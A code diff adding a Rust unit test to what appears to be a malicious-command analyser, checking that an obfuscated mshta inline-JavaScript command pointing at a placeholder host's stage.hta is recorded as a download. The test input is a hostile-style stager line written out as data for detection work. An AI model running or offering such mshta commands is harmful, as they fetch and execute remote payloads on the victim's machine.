@@ -5744,6 +5744,22 @@ mod misc_handler_tests {
     }
 
     #[test]
+    fn mshta_javascript_location_url_emits_download() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"mshta "javascript:location='hTtPs:\\mshta-js.example\stage.hta';close()""#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, cmd, dst: None }
+                    if src == "https://mshta-js.example/stage.hta" && cmd.starts_with("mshta ")
+            )
+        });
+        assert!(has, "no mshta inline JavaScript Download: {:?}", env.traits);
+    }
+
+    #[test]
     fn rundll32_records_cmd() {
         let mut env = Environment::new(&Config::default());
         interpret_line("rundll32 some.dll,EntryPoint", &mut env);
